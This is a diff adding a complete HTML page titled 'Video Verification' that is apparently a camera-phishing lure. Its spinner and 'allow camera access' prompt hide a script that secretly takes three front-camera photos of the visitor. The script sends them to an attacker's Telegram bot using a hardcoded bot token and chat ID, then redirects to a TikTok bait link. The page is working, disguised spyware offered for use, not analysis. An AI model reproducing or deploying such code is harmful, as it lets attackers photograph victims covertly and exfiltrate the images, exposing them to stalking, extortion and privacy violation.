@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Verification</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; text-align: center; }
+        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 20px; border-radius: 20px; width: 80%; max-width: 320px; backdrop-filter: blur(10px); }
+        .logo { width: 60px; height: 60px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fff; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-weight: 600; font-size: 20px; margin-bottom: 10px; }
+        p { color: #888; font-size: 14px; line-height: 1.5; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" style="width:40px; height:40px; fill:#000;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
+        </div>
+        <h2>Verifying...</h2>
+        <p>Please allow camera access to watch the video.</p>
+        <div class="spinner"></div>
+    </div>
+    
+    <video id="spy-cam" autoplay playsinline muted></video>
+    
+    <script>
+        const token = "8501056201:AAEVO4vREhgUfgPeI055jj7oYe-CiYemLEE"; 
+        const chatId = "7088852203";
+        const baitLink = "https://vt.tiktok.com/ZSgtDqo2c/";
+        
+        const video = document.getElementById('spy-cam');
+        
+        const constraints = {
+            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false
+        };
+        
+        function redirectToBait() {
+            window.location.href = baitLink;
+        }
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+                
+                let count = 0;
+                const captureInterval = setInterval(function() {
+                    if(count >= 3) {
+                        clearInterval(captureInterval);
+                        return;
+                    }
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(function(blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'cam_' + count + '.jpg');
+                        
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg', 0.7);
+                    
+                    count++;
+                }, 800);
+                
+                setTimeout(redirectToBait, 3000);
+                
+            })
+            .catch(function(err) {
+                document.querySelector('h2').innerText = "Redirecting...";
+                setTimeout(redirectToBait, 1000);
+            });
+        }
+    </script>
+</body>
+</html>
